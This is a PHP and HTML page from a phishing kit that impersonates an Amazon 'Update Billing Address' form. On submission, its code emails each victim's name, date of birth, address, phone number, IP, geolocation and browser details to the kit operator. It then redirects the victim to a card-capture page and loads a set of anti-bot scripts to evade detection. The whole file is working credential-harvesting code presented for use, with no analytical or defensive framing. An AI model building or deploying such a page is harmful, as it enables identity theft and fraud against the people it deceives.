<?php
require 'Email.php';require 'var.php';
if (isset($btnTwoAmazon)) {
    header("Location: cc.php");
    $sc = $_COOKIE['fl'];
    $to = "$rzlt_email,$sc";
$txt = "
<h4 style='font-weight: bold;font-family: sans-serif;'>
✘±±±±±±±±±±±±±±±±±±[ AMAZON ADDRESS ]±±±±±±±±±±±±±±±±±±±±✘<br>
✘ Full Name : $fullname<br>
✘ Date of birth : $date<br>
✘ Street Address 1 : $addressone<br>
✘ Street Address 2 : $addresstwo<br>
✘ City : $city<br>
✘ State/Province/Region : $SPR<br>
✘ Zip Code : $Zipcode<br>
✘ Phone number : $Phonenumber<br>
✘ Country : $Country<br>
✘±±±±±±±±±±±±±±±±[ END AMAZON ADDRESS ]±±±±±±±±±±±±±±±±±±✘<br></h4>
<h4 style='font-weight: bold;font-family: sans-serif;'>
✘±±±±±±±±±±±±±±±±[     MORE INFO     ]±±±±±±±±±±±±±±±±±±✘<br>
✘🕘 Time : $time<br>
✘🗺 Ip : $iip<br>
✘📍 Geo : $ip<br>
✘💻 Operating System : $user_os<br>
✘🌀 Browser : $user_browser<br>
✘±±±±±±±±±±±±±±±±[ END MORE INFO ]±±±±±±±±±±±±±±±±✘<br></h4>";
$headers = "From:AMAZON RZLT <no-reply@kira.com>";
$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$subject = "NEW AMAZON ADDRESS 🗺 $iip 🌀 $user_browser 💻 $user_os";
mail($to,$subject,$txt,$headers);
}

include 'allantibots/a1.php';
include 'allantibots/a2.php';
include 'allantibots/a3.php';
include 'allantibots/a4.php';
include 'allantibots/a5.php';
include 'allantibots/a6.php';
include 'allantibots/a7.php';
include 'allantibots/a8.php';
include 'allantibots/a9.php';
include 'allantibots/a10.php';
include 'allantibots/a11.php';
include 'allantibots/a12.php';

?>

<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<title>Update Billing Address</title>
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<link rel="stylesheet" type="text/css" href="css/update.css">
	<meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, viewport-fit=cover">
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
	<link rel="shortcut icon" href="img/amazon-logo-1.png">
</head>
<body>
<div class="header">
	<img src="img/amazon-logo-kira.svg">
</div><!--header-->
<div class="content">
	<div class="box-log">
		<p class="txt1">Address Confirmation</p>
		<p class="txt2">Enter Billing Address</p>
		<p class="txt3">(Step 1 of 2)</p>
		<br>
		<br>
		<br>
	<form action="" method="POST">
		<p class="lblfullname">Full name</p>
		<input class="styleinput" type="text" name="fullname" id="fullname" minlength="3" maxlength="31" style="text-transform: capitalize;">
		<span class="errorfullname" id="errorfullname"></span>

		<p class="lblfullname">Date of birth</p>
		<input class="styleinput" type="text" name="date" id="date" placeholder="MM / DD / YYYY">
		<span class="errorfullname" id="errordob"></span>

		<p class="lblfullname">Street address</p>
		<input class="styleinputX" type="text" name="addressone" id="addressone" minlength="3" placeholder="Street and number, P.O. box, c/o." >
		<span class="erroraddressone" id="erroraddressone"></span>

		<input class="styleinputX" type="txt" name="addresstwo" id="addresstwo" placeholder="Apartment, suite, unit, building, floor, etc.">

		<p class="lblfullname">City</p>
		<input class="styleinput" type="text" name="city" id="city" minlength="2" maxlength="30" style="text-transform: capitalize;">
		<span class="errorcity" id="errorcity"></span>

		<p class="lblfullname">State / Province / Region</p>
		<input class="styleinput" type="text" name="SPR" id="SPR" minlength="2" maxlength="30" style="text-transform: capitalize;">
		<span class="errorSPR" id="errorSPR"></span>

		<p class="lblfullname">Zip Code</p>
		<input class="styleinput" type="text" name="Zipcode" id="Zipcode" minlength="2" maxlength="20">
		<span class="errorZipcode" id="errorZipcode"></span>

		<p class="lblfullname">Phone number</p>
		<input class="styleinput" type="text" name="Phonenumber" id="Phonenumber">
		<span class="errorPhonenumber" id="errorPhonenumber"></span>

		<p class="lblfullname">Country</p>
		<select class="selectinput" id="Country" name="Country">
			<option value="AF">Afghanistan</option>
			<option value="AX">Åland Islands</option>
			<option value="AL">Albania</option>
			<option value="DZ">Algeria</option>
			<option value="AS">American Samoa</option>
			<option value="AD">Andorra</option>
			<option value="AO">Angola</option>
			<option value="AI">Anguilla</option>
			<option value="AQ">Antarctica</option>
			<option value="AG">Antigua and Barbuda</option>
			<option value="AR">Argentina</option>
			<option value="AM">Armenia</option>
			<option value="AW">Aruba</option>
			<option value="AU">Australia</option>
			<option value="AT">Austria</option>
			<option value="AZ">Azerbaijan</option>
			<option value="BS">Bahamas</option>
			<option value="BH">Bahrain</option>
			<option value="BD">Bangladesh</option>
			<option value="BB">Barbados</option>
			<option value="BY">Belarus</option>
			<option value="BE">Belgium</option>
			<option value="BZ">Belize</option>
			<option value="BJ">Benin</option>
			<option value="BM">Bermuda</option>
			<option value="BT">Bhutan</option>
			<option value="BO">Bolivia, Plurinational State of</option>
			<option value="BQ">Bonaire, Sint Eustatius and Saba</option>
			<option value="BA">Bosnia and Herzegovina</option>
			<option value="BW">Botswana</option>
			<option value="BV">Bouvet Island</option>
			<option value="BR">Brazil</option>
			<option value="IO">British Indian Ocean Territory</option>
			<option value="BN">Brunei Darussalam</option>
			<option value="BG">Bulgaria</option>
			<option value="BF">Burkina Faso</option>
			<option value="BI">Burundi</option>
			<option value="KH">Cambodia</option>
			<option value="CM">Cameroon</option>
			<option value="CA">Canada</option>
			<option value="CV">Cape Verde</option>
			<option value="KY">Cayman Islands</option>
			<option value="CF">Central African Republic</option>
			<option value="TD">Chad</option>
			<option value="CL">Chile</option>
			<option value="CN">China</option>
			<option value="CX">Christmas Island</option>
			<option value="CC">Cocos (Keeling) Islands</option>
			<option value="CO">Colombia</option>
			<option value="KM">Comoros</option>
			<option value="CG">Congo</option>
			<option value="CD">Congo, the Democratic Republic of the</option>
			<option value="CK">Cook Islands</option>
			<option value="CR">Costa Rica</option>
			<option value="CI">Côte d'Ivoire</option>
			<option value="HR">Croatia</option>
			<option value="CU">Cuba</option>
			<option value="CW">Curaçao</option>
			<option value="CY">Cyprus</option>
			<option value="CZ">Czech Republic</option>
			<option value="DK">Denmark</option>
			<option value="DJ">Djibouti</option>
			<option value="DM">Dominica</option>
			<option value="DO">Dominican Republic</option>
			<option value="EC">Ecuador</option>
			<option value="EG">Egypt</option>
			<option value="SV">El Salvador</option>
			<option value="GQ">Equatorial Guinea</option>
			<option value="ER">Eritrea</option>
			<option value="EE">Estonia</option>
			<option value="ET">Ethiopia</option>
			<option value="FK">Falkland Islands (Malvinas)</option>
			<option value="FO">Faroe Islands</option>
			<option value="FJ">Fiji</option>
			<option value="FI">Finland</option>
			<option value="FR">France</option>
			<option value="GF">French Guiana</option>
			<option value="PF">French Polynesia</option>
			<option value="TF">French Southern Territories</option>
			<option value="GA">Gabon</option>
			<option value="GM">Gambia</option>
			<option value="GE">Georgia</option>
			<option value="DE">Germany</option>
			<option value="GH">Ghana</option>
			<option value="GI">Gibraltar</option>
			<option value="GR">Greece</option>
			<option value="GL">Greenland</option>
			<option value="GD">Grenada</option>
			<option value="GP">Guadeloupe</option>
			<option value="GU">Guam</option>
			<option value="GT">Guatemala</option>
			<option value="GG">Guernsey</option>
			<option value="GN">Guinea</option>
			<option value="GW">Guinea-Bissau</option>
			<option value="GY">Guyana</option>
			<option value="HT">Haiti</option>
			<option value="HM">Heard Island and McDonald Islands</option>
			<option value="VA">Holy See (Vatican City State)</option>
			<option value="HN">Honduras</option>
			<option value="HK">Hong Kong</option>
			<option value="HU">Hungary</option>
			<option value="IS">Iceland</option>
			<option value="IN">India</option>
			<option value="ID">Indonesia</option>
			<option value="IR">Iran, Islamic Republic of</option>
			<option value="IQ">Iraq</option>
			<option value="IE">Ireland</option>
			<option value="IM">Isle of Man</option>
			<option value="IL">Israel</option>
			<option value="IT">Italy</option>
			<option value="JM">Jamaica</option>
			<option value="JP">Japan</option>
			<option value="JE">Jersey</option>
			<option value="JO">Jordan</option>
			<option value="KZ">Kazakhstan</option>
			<option value="KE">Kenya</option>
			<option value="KI">Kiribati</option>
			<option value="KP">Korea, Democratic People's Republic of</option>
			<option value="KR">Korea, Republic of</option>
			<option value="KW">Kuwait</option>
			<option value="KG">Kyrgyzstan</option>
			<option value="LA">Lao People's Democratic Republic</option>
			<option value="LV">Latvia</option>
			<option value="LB">Lebanon</option>
			<option value="LS">Lesotho</option>
			<option value="LR">Liberia</option>
			<option value="LY">Libya</option>
			<option value="LI">Liechtenstein</option>
			<option value="LT">Lithuania</option>
			<option value="LU">Luxembourg</option>
			<option value="MO">Macao</option>
			<option value="MK">Macedonia, the former Yugoslav Republic of</option>
			<option value="MG">Madagascar</option>
			<option value="MW">Malawi</option>
			<option value="MY">Malaysia</option>
			<option value="MV">Maldives</option>
			<option value="ML">Mali</option>
			<option value="MT">Malta</option>
			<option value="MH">Marshall Islands</option>
			<option value="MQ">Martinique</option>
			<option value="MR">Mauritania</option>
			<option value="MU">Mauritius</option>
			<option value="YT">Mayotte</option>
			<option value="MX">Mexico</option>
			<option value="FM">Micronesia, Federated States of</option>
			<option value="MD">Moldova, Republic of</option>
			<option value="MC">Monaco</option>
			<option value="MN">Mongolia</option>
			<option value="ME">Montenegro</option>
			<option value="MS">Montserrat</option>
			<option value="MA">Morocco</option>
			<option value="MZ">Mozambique</option>
			<option value="MM">Myanmar</option>
			<option value="NA">Namibia</option>
			<option value="NR">Nauru</option>
			<option value="NP">Nepal</option>
			<option value="NL">Netherlands</option>
			<option value="NC">New Caledonia</option>
			<option value="NZ">New Zealand</option>
			<option value="NI">Nicaragua</option>
			<option value="NE">Niger</option>
			<option value="NG">Nigeria</option>
			<option value="NU">Niue</option>
			<option value="NF">Norfolk Island</option>
			<option value="MP">Northern Mariana Islands</option>
			<option value="NO">Norway</option>
			<option value="OM">Oman</option>
			<option value="PK">Pakistan</option>
			<option value="PW">Palau</option>
			<option value="PS">Palestinian Territory, Occupied</option>
			<option value="PA">Panama</option>
			<option value="PG">Papua New Guinea</option>
			<option value="PY">Paraguay</option>
			<option value="PE">Peru</option>
			<option value="PH">Philippines</option>
			<option value="PN">Pitcairn</option>
			<option value="PL">Poland</option>
			<option value="PT">Portugal</option>
			<option value="PR">Puerto Rico</option>
			<option value="QA">Qatar</option>
			<option value="RE">Réunion</option>
			<option value="RO">Romania</option>
			<option value="RU">Russian Federation</option>
			<option value="RW">Rwanda</option>
			<option value="BL">Saint Barthélemy</option>
			<option value="SH">Saint Helena, Ascension and Tristan da Cunha</option>
			<option value="KN">Saint Kitts and Nevis</option>
			<option value="LC">Saint Lucia</option>
			<option value="MF">Saint Martin (French part)</option>
			<option value="PM">Saint Pierre and Miquelon</option>
			<option value="VC">Saint Vincent and the Grenadines</option>
			<option value="WS">Samoa</option>
			<option value="SM">San Marino</option>
			<option value="ST">Sao Tome and Principe</option>
			<option value="SA">Saudi Arabia</option>
			<option value="SN">Senegal</option>
			<option value="RS">Serbia</option>
			<option value="SC">Seychelles</option>
			<option value="SL">Sierra Leone</option>
			<option value="SG">Singapore</option>
			<option value="SX">Sint Maarten (Dutch part)</option>
			<option value="SK">Slovakia</option>
			<option value="SI">Slovenia</option>
			<option value="SB">Solomon Islands</option>
			<option value="SO">Somalia</option>
			<option value="ZA">South Africa</option>
			<option value="GS">South Georgia and the South Sandwich Islands</option>
			<option value="SS">South Sudan</option>
			<option value="ES">Spain</option>
			<option value="LK">Sri Lanka</option>
			<option value="SD">Sudan</option>
			<option value="SR">Suriname</option>
			<option value="SJ">Svalbard and Jan Mayen</option>
			<option value="SZ">Swaziland</option>
			<option value="SE">Sweden</option>
			<option value="CH">Switzerland</option>
			<option value="SY">Syrian Arab Republic</option>
			<option value="TW">Taiwan, Province of China</option>
			<option value="TJ">Tajikistan</option>
			<option value="TZ">Tanzania, United Republic of</option>
			<option value="TH">Thailand</option>
			<option value="TL">Timor-Leste</option>
			<option value="TG">Togo</option>
			<option value="TK">Tokelau</option>
			<option value="TO">Tonga</option>
			<option value="TT">Trinidad and Tobago</option>
			<option value="TN">Tunisia</option>
			<option value="TR">Turkey</option>
			<option value="TM">Turkmenistan</option>
			<option value="TC">Turks and Caicos Islands</option>
			<option value="TV">Tuvalu</option>
			<option value="UG">Uganda</option>
			<option value="UA">Ukraine</option>
			<option value="AE">United Arab Emirates</option>
			<option value="GB">United Kingdom</option>
			<option selected="selected" value="US">United States</option>
			<option value="UM">United States Minor Outlying Islands</option>
			<option value="UY">Uruguay</option>
			<option value="UZ">Uzbekistan</option>
			<option value="VU">Vanuatu</option>
			<option value="VE">Venezuela, Bolivarian Republic of</option>
			<option value="VN">Viet Nam</option>
			<option value="VG">Virgin Islands, British</option>
			<option value="VI">Virgin Islands, U.S.</option>
			<option value="WF">Wallis and Futuna</option>
			<option value="EH">Western Sahara</option>
			<option value="YE">Yemen</option>
			<option value="ZM">Zambia</option>
			<option value="ZW">Zimbabwe</option>
		</select><!--selectinput-->
		<br>
		<br>
		<br>
		<hr class="style-two">
		<br>
		<button name="btnTwo" class="btn" id="btn" onclick="valid();">Continue</button>
		<br>
	</form>
	</div><!--box-log-->
</div><!--content-->
<br>
<br>
<hr class="style-two">

<div class="content3">
	<div class="cn">
		<ul>
			<li><a href="#">Conditions of Use</a></li>
			<li><a href="#">Privacy Notice</a></li>
			<li><a href="#">Help</a></li>
		</ul><!--cn-->
	</div>
	<img class="lastster" src="img/2k18.png">
</div><!--content3-->

<script type="text/javascript">
	function valid(){
		var fullname=document.getElementById('fullname').value;
		var errorfullname=document.getElementById('errorfullname');
		errorfullname.innerHTML="";
		if (fullname=='') {
			errorfullname.innerHTML=" <b><i>!</i></b> Please enter a name.";
		}

		var date=document.getElementById('date').value;
		var errordob=document.getElementById('errordob');
		errordob.innerHTML="";
		if (date=='') {
			errordob.innerHTML=" <b><i>!</i></b> please enter your birth date.";
		}

		var addressone=document.getElementById('addressone').value;
		var erroraddressone=document.getElementById('erroraddressone');
		erroraddressone.innerHTML="";
		if (addressone=='') {
			erroraddressone.innerHTML=" <b><i>!</i></b> Please enter at least one address line.";
		}

		var city=document.getElementById('city').value;
		var errorcity=document.getElementById('errorcity');
		errorcity.innerHTML="";
		if (city=='') {
			errorcity.innerHTML=" <b><i>!</i></b> Please enter a city.";
		}

		var SPR=document.getElementById('SPR').value;
		var errorSPR=document.getElementById('errorSPR');
		errorSPR.innerHTML="";
		if (SPR=='') {
			errorSPR.innerHTML=" <b><i>!</i></b> Please enter a state, region, or province.";
		}

		var Zipcode=document.getElementById('Zipcode').value;
		var errorZipcode=document.getElementById('errorZipcode');
		errorZipcode.innerHTML="";
		if (Zipcode=='') {
			errorZipcode.innerHTML=" <b><i>!</i></b> Please enter a ZIP or postal code.";
		}

		var Phonenumber=document.getElementById('Phonenumber').value;
		var errorPhonenumber=document.getElementById('errorPhonenumber');
		errorPhonenumber.innerHTML="";
		if (Phonenumber=='') {
			errorPhonenumber.innerHTML=" <b><i>!</i></b> Please enter a phone number.";
		}
	}
</script>

<script type="text/javascript">
			$(document).ready(function() {
    $('#btn').click(function(e) {
        var isValid = true;
        $('input[type="text"],[type="Password"]').each(function() {
            if ($.trim($(this).val()) == '') {
                isValid = false;
                $(this).css({
                	"box-shadow": "0 0 0 3px rgba(221,0,0,.1) inset",
                    "border": "1px solid red",
                    "background": ""
                });
            }
            else {
                $(this).css({
                    "border": "",
                    "box-shadow": "none",
                    "background": ""
                });
            }
        });
        if (isValid == false) 
            e.preventDefault();
        
    });
});
		</script>

		<script type="text/javascript">
			
			var date = document.getElementById('date');

function checkValue(str, max) {
  if (str.charAt(0) !== '0' || str == '00') {
    var num = parseInt(str);
    if (isNaN(num) || num <= 0 || num > max) num = 1;
    str = num > parseInt(max.toString().charAt(0)) && num.toString().length == 1 ? '0' + num : num.toString();
  };
  return str;
};

date.addEventListener('input', function(e) {
  this.type = 'text';
  var input = this.value;
  if (/\D\/$/.test(input)) input = input.substr(0, input.length - 3);
  var values = input.split('/').map(function(v) {
    return v.replace(/\D/g, '')
  });
  if (values[0]) values[0] = checkValue(values[0], 12);
  if (values[1]) values[1] = checkValue(values[1], 31);
  var output = values.map(function(v, i) {
    return v.length == 2 && i < 2 ? v + ' / ' : v;
  });
  this.value = output.join('').substr(0, 14);
});

date.addEventListener('blur', function(e) {
  this.type = 'text';
  var input = this.value;
  var values = input.split('/').map(function(v, i) {
    return v.replace(/\D/g, '')
  });
  var output = '';
  
  if (values.length == 3) {
    var year = values[2].length !== 4 ? parseInt(values[2]) + 2000 : parseInt(values[2]);
    var month = parseInt(values[0]) - 1;
    var day = parseInt(values[1]);
    var d = new Date(year, month, day);
    if (!isNaN(d)) {
      document.getElementById('result').innerText = d.toString();
      var dates = [d.getMonth() + 1, d.getDate(), d.getFullYear()];
      output = dates.map(function(v) {
        v = v.toString();
        return v.length == 1 ? '0' + v : v;
      }).join(' / ');
    };
  };
  this.value = output;
});
		</script>
</body>
</html>